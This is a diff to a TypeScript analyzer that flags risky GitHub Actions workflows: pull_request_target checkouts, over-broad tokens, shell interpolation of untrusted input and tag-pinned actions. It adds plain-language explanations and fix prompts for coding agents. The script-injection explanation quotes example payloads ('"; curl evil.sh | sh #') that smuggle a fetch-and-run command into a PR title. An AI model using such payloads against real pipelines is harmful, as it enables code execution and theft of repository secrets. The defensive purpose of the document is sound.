@@ -110,6 +110,8 @@ export function analyzeWorkflow(
                 "pull_request_target runs with repo secrets and write token, then checks out attacker-controlled code — the classic RCE combination.",
             },
             fix: "Use `pull_request` instead, or if you need base-repo secrets, split into two workflows: an untrusted build on `pull_request` that uploads an artifact, and a trusted `workflow_run` that consumes it. Never check out the PR head under pull_request_target.",
+            why: "Anyone can open a PR from a fork. This workflow runs that stranger's code with your repo's secrets and a write token — they can exfiltrate your secrets or push to your repo just by opening a pull request.",
+            agentPrompt: `In ${path}, a job triggered by pull_request_target checks out the untrusted PR head. Rewrite it so untrusted code never runs with secrets: either switch the trigger to \`pull_request\`, or split it into an untrusted \`pull_request\` build that uploads an artifact plus a trusted \`workflow_run\` that consumes it. Remove the \`with.ref\` that checks out the PR head under pull_request_target.`,
           });
         }
       }
@@ -135,6 +137,8 @@ export function analyzeWorkflow(
           "A broad token means a compromised step (or dependency) can push code, publish releases, or tamper with the repo.",
       },
       fix: "Set `permissions: {}` at the top and grant the least privilege each job needs (e.g. `contents: read`). Add write scopes only on the specific job that requires them.",
+      why: "The workflow's token can write everything — code, releases, packages, pages. One compromised step or a malicious transitive dependency inherits all of it and can rewrite your repo or ship a poisoned release.",
+      agentPrompt: `In ${path}, the workflow token is over-scoped (write-all or broad write). Add \`permissions: {}\` at the workflow top level, then grant each job only the least privilege it needs (usually \`contents: read\`), adding a specific write scope like \`contents: write\` only on the one job that truly requires it.`,
     });
   }
 
@@ -156,6 +160,8 @@ export function analyzeWorkflow(
               'Attacker-controlled text is substituted directly into the shell before it runs — a PR title of `"; curl evil | sh #` executes.',
           },
           fix: `Pass the value through an intermediate env var instead of interpolating it inline: set \`env: TITLE: \${{ ${hit} }}\` on the step and reference \`"$TITLE"\` in the script, so the shell treats it as data, not code.`,
+          why: `\${{ ${hit} }} is attacker-controlled text pasted straight into your shell before it runs. Someone titles their PR \`"; curl evil.sh | sh #\` and your runner executes it with your token.`,
+          agentPrompt: `In ${path}, a run step interpolates the untrusted expression \${{ ${hit} }} directly into the shell (a script-injection risk). Move it into an intermediate env var on the step — \`env:\` with the expression — and reference the quoted \`"$VAR"\` in the run script so the shell treats it as data, not code. Apply the same fix to any sibling steps that interpolate untrusted github.event values.`,
         });
         break; // one per step is enough
       }
@@ -181,6 +187,8 @@ export function analyzeWorkflow(
             "A floating tag can be moved by the action's maintainer (or an attacker who compromises them) to run new code in your pipeline.",
         },
         fix: `Pin to a full 40-character commit SHA: \`uses: ${step.uses.split("@")[0]}@<sha>  # ${step.uses.split("@")[1] ?? "tag"}\`. Let Dependabot bump the SHA.`,
+        why: `A tag like \`@v1\` is mutable. If the action's maintainer is compromised (or turns malicious), they repoint the tag and your pipeline runs their new code with your secrets the next time it fires — no change on your side.`,
+        agentPrompt: `In ${path}, the third-party action \`${step.uses}\` is pinned to a mutable tag, not a commit SHA. Replace the ref with the full 40-character commit SHA of that release, keeping the tag in a trailing comment (e.g. \`uses: ${step.uses.split("@")[0]}@<sha>  # ${step.uses.split("@")[1] ?? "tag"}\`). Do the same for every other third-party (non-actions/, non-github/) action in the file, and enable Dependabot for github-actions so the SHAs still get bumped.`,
       });
     }
   }
